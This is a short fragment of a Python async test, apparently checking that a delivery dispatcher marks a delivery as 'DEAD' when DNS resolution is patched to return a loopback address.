    monkeypatch.setattr(socket, "getaddrinfo", _return_loopback)
    status2 = await dispatch_single_delivery(db_session, claim2)
    assert status2 == "DEAD"
